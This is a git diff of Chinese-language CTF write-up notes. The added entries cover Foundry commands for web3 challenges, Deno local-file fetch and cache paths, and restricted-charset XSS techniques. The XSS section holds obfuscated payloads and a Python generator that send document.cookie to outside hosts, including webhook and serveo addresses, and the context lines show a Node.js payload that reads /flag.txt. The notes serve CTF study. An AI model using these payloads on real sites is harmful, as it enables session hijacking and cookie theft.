@@ -1468,7 +1468,7 @@ import(dataUri);
 ```js
 process.mainModule.require("express").response.send=function(){this.end(process.mainModule.constructor._load("fs").readFileSync("/flag.txt","utf-8"))}
 ```
-- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator。
+- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator
 199. php文件包含rce。
 ```php
 <?php
@@ -1774,7 +1774,7 @@ while true; do curl -i -s -k -X $'POST' \
     $'http://example.com/graphql/console'; done
 ```
 209. [Oh sh. Here we go again ?](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-00--oh-sh-here-we-go-again-)
-- 题目给出contract被deploy的地址后，可以利用[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html)命令cast code获取其bytecode。`cast code <addr> --rpc-url $RPC_URL`.其中RPC_URL题目会提供。也可以用node js的web3库
+- 题目给出contract被deploy的地址后，可以利用[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html)命令cast code获取其bytecode。`cast code <contract addr> --rpc-url $RPC_URL`.其中RPC_URL题目会提供。也可以用node js的web3库
 ```js
 const Web3 = require('web3');
 const rpcUrl = ''; // Replace with your custom RPC URL
@@ -2561,4 +2561,54 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
     - approve(spender addr,amount)：允许addr处的contract使用amount这么多的token（所有者使用该函数后其他contract才能使用transferFrom将最多amount的token从所有者那里转走）
     - allowance(spender,this)：返回spender（token所有者）允许被转走的token数量
     - balanceOf(addr):返回addr拥有的token数量
-- 使用forge释放contract:`forge create file.sol:<contract_name> --private-key <your_private_key> --rpc-url <your_rpc_url>`
+- 使用forge释放contract:`forge create file.sol:<contract_name> --private-key <private_key> --rpc-url <rpc_url>`
+263. [Deception](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-3-deception)
+- 利用cast code获取指定地址处的contract的bytecode
+- 使用cast storage分析指定地址处的contract的storage layout：`cast storage <contract_addr> <storage_slot_num> --rpc-url <rpc_url>`
+- 使用cast send调用含参数的函数
+264. [Safe Proxy](https://untrue.me/writeups/crewctf2023/safe-proxy/)
+- [deno](https://github.com/denoland/deno)(A modern runtime for JavaScript and TypeScript)允许fetch函数的参数为`file://`，即可以通过fetch获取本地文件。
+- `$DENO_DIR`默认为`$HOME/.deno`
+- https://denolib.gitbook.io/guide/advanced/deno_dir-code-fetch-and-cache ：`$DENO_DIR/deps` is used to store files fetched through remote url import. It contains subfolders based on url scheme (currently only http and https), and store files to locations based on the URL path. 例如，`import {xxx} from "http://host:8082/?token=abc";`，则文件出现于`$DENO_DIR/deps/http/host_PORT8082/`。另外，根据 https://github.com/denoland/deno/blob/21cc279481ac5bffc29641e917e868dca42189d3/cli/cache/http_cache.rs#L69 ，文件名需要hash。因此文件的完整路径为`$DENO_DIR/deps/http/host_PORT8082/fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c`(`fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c=sha256(b"/?token=abc").hexdigest()`)
+- 在`deno/`文件夹下有个`dep_analysis_cache_v1`文件，a sqlite database storing information about the imported modules. This file contains the full url used when making the requestThis file contains the full url used when making the request, 包括port和get参数
+265. [Hex2Dec](https://github.com/L-T-B/CTFS/blob/main/crew-ctf/web/hex2dec.md)
+- 使用“0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde +-”的字符集构建xss代码。以下是一些构造的技巧
+    - 调用函数时括号不是必须的。如"alert`XSS`"等于`alert("XSS")`。更多参考 https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses
+    - 可以用方括号访问属性。 https://dmitripavlutin.com/access-object-properties-javascript/
+    - 可以用元素的id访问html里的元素。假设有一个div元素`<DIV ID=XSS>`（无需`</div>`，大小写不重要），则在js里可以通过XSS来获取这个元素。配合上一点，"XSS[`ownerDocument`]"能获取到Document元素（使用`号还是引号'不重要）
+    - jsfuck构造任意字符技巧： https://github.com/aemkei/jsfuck 。不过需要的字符很多，而且要eval，若csp不允许eval则无法使用。里面的字符构造技巧还是值得参考的。相关链接： https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck
+- 其他payload
+    ```html
+    <DIV ID=XSS><IMG SRC=X ONERROR=A=`a`;B=`b`;C=`c`;D=`d`;E=`e`;F=`f`;INF=+`1e10001`;INFSTR=INF+[];I=INFSTR[3];N=INFSTR[1];T=INFSTR[6];Y=INFSTR[7];FALSE=1==0;FALSE=FALSE+[];L=FALSE[2];S=FALSE[3];TRUE=1==1;TRUE=TRUE+[];R=TRUE[1];U=TRUE[2];FLAT=[][F+L+A+T];FLAT=FLAT+[];O=FLAT[6];V=FLAT[27];EMPTYSTRING=[]+[];STRING=EMPTYSTRING[C+O+N+S+T+R+U+C+T+O+R];STRINGSTR=STRING+[];G=STRINGSTR[14];NUMBER=0[C+O+N+S+T+R+U+C+T+O+R];NUMBER=NUMBER+[];M=NUMBER[11];G=STRING[N+A+M+E][5];H=101[T+O+`S`+T+R+I+N+G]`21`[1];K=20[T+O+`S`+T+R+I+N+G]`21`;P=211[T+O+`S`+T+R+I+N+G]`31`[1];Q=212[T+O+`S`+T+R+I+N+G]`31`[1];V=31[T+O+`S`+T+R+I+N+G]`32`;W=32[T+O+`S`+T+R+I+N+G]`33`;X=101[T+O+`S`+T+R+I+N+G]`34`[1];Z=35[T+O+`S`+T+R+I+N+G]`36`;ARRAYITER=[]+[][E+N+T+R+I+E+S]``;J=ARRAYITER[3];PERIOD=+`11e100`+[];PERIOD=PERIOD[1];FORWARDSLASH=STRING[F+R+O+M+`C`+H+A+R+`C`+O+D+E]`47`;XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][L+O+C+A+T+I+O+N]=FORWARDSLASH+FORWARDSLASH+Y+Z+3+0+J+S+Y+L+PERIOD+R+E+Q+U+E+S+T+R+E+P+O+PERIOD+C+O+M+`?`+XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][C+O+O+K+I+E]>
+    ```
+    ```py
+    def gen_str(s):
+    chars = []
+    for c in s:
+        if c.islower():
+            idx = ord(c) - ord("a")
+            chars.append(f"X[{idx}]")
+        elif c == "`":
+            chars.append(f"`\\``")
+        elif c == "\\":
+            chars.append(f"`\\\\`")
+        else:
+            chars.append(f"`{c}`")
+    return "+".join(chars)
+    def gen_unicode_str(s):
+        return "".join([f"\\u{ord(c):04X}" for c in s]) #将参数表示成\uxxxx的形式
+    webhook = "https://webhook.example.com/?"
+    payload = "<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>" #这里A标签的id是A，所以js里可以用A访问。下面A+``直接获取到HREF内容的小写
+    payload += "<IMG SRC ONERROR="
+    payload += "X=A+``;"
+    payload += f"HREF={gen_str('href')};"
+    payload += f"CLICK={gen_str('click')};"
+    payload += f"COOKIE={gen_str('cookie')};"
+    payload += f"A[HREF]={gen_str(f'javascript:location[HREF]=`{gen_unicode_str(webhook)}`+document[COOKIE]')};"
+    payload += f"A[CLICK]``;"
+    payload += ">"
+    print(payload)
+    ```
+    ```html
+    <K ID=A><DIV ID=B><IMG SRC ID=AA ONERROR=DOT=[A[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]+[]][0];AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]=`HTTPS:`+DOT[5]+DOT[5]+`IMBRIUM`+DOT[18]+`SERVEO`+DOT[18]+`NET?C=`+AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][5]+[A+[]][0][1]+[A+[]][0][1]+[A+[]][0][14]+[B+[]][0][13]+[A+[]][0][4]]>
+    ```
